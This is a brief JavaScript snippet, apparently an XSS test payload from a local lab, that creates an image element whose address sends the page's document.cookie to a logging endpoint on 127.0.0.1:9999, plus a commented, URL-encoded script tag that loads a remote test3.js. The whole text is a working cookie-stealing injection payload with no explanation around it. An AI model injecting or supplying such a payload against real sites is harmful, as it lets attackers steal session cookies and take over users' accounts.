var img = document.createElement('img');
img.src = "http://127.0.0.1:9999/log?" + escape(document.cookie);
document.body.appendChild(img);

// <script%20src=http://127.0.0.1:8888/test3.js%20></script>